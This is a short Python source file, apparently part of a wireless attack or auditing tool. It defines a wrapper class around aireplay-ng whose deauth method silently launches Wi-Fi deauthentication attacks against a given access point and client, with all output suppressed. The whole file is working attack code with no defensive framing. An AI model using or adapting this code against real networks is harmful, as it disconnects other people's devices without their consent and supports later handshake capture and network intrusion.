import os
import time
from subprocess import Popen, DEVNULL

class Aireplay:
    """
        Wrapper class for aireplay-ng
        @miff
        @bssid
        @channel
    """

    AIREPLAY = "aireplay-ng"
    DEAUTH = "--deauth"
    DEAUTH_BSSID_FLAG = "-a"
    DEAUTH_CLIENT_FLAG = "-c"

    def __init__(self, miff, bssid, channel):
        self._miff = miff
        self._bssid = bssid
        self._ch = channel

    def __start(self, args):
        # build aireplay flags
        flags = args

        if self.DEAUTH_BSSID_FLAG not in flags:
            flags.extend([self.DEAUTH_BSSID_FLAG, self._bssid])
        if '--ignore-negative-one' not in flags:
            flags.extend(["--ignore-negative-one"])

        # build Popen command as list
        cmd = [self.AIREPLAY] + flags + [self._miff]

        print("\t" + " ".join(cmd))

        self._proc = Popen(cmd,env={'PATH': os.environ['PATH']}, \
                               stderr=DEVNULL, stdin=DEVNULL, stdout=DEVNULL)

        return True

    def deauth(self, n, client):
        args = []
        args.extend([self.DEAUTH, n])
        args.extend([self.DEAUTH_CLIENT_FLAG, client])

        return self.__start(args)
